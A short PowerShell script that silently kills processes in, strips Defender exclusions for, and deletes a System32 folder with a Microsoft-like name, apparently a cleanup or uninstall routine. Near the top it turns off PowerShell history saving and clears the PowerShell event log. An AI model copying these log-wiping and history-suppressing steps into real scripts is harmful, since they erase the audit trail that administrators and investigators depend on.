# This script silently removes a specified folder and its contents, stops any processes running from within that folder, 
# and removes any Windows Defender exclusions related to the folder or its contents.

# Define variables
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent  # Set to suppress errors for silent mode

# Stop any running executables or PowerShell scripts within the folder
$processes = Get-Process | Where-Object { $_.Path -like "$basepath\*" }
foreach ($process in $processes) {
    try {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# Remove any exclusions in Windows Defender for the base path and its contents
$exclusions = (Get-MpPreference).ExclusionPath | Where-Object { $_ -like "$basepath*" }
foreach ($exclusion in $exclusions) {
    Remove-MpPreference -ExclusionPath $exclusion -ErrorAction SilentlyContinue | Out-Null
}

# Delete the folder and its contents
if (Test-Path -Path $basepath) {
    Remove-Item -Path $basepath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
}

# Reset the error action preference if needed for further scripting
$ErrorActionPreference = "Continue"